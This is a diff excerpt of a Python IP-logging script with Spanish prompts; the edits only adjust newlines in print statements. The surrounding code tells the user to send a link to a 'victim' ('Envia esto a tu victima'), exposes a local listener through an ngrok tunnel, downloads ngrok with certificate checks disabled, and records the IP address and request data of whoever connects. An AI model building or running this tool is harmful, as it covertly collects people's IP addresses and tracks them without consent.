@@ -46,7 +46,7 @@ def ip():
         print("Envia esto a tu victima: ")
         print(str(os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n")))
     if seleccion == "02" or seleccion == "2":
-        print("Envia esto a tu victima:{0}:{1}\n".format(HOST, PORT))
+        print("Envia esto a tu victima:{0}:{1}".format(HOST, PORT))
     if seleccion == "03" or seleccion == "3":
         print("\nespera un minuto, esto puede tardar debido a tu conexion\n")
         os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
@@ -62,7 +62,7 @@ def ip():
         
     while True:
         conexion, addr = listen_socket.accept() 
-        print("[*]IP Logged!" + (str(addr)))
+        print("\n[*]IP Logged!" + (str(addr)))
         request = conexion.recv(1024)
         print(request.decode('utf-8'))
 
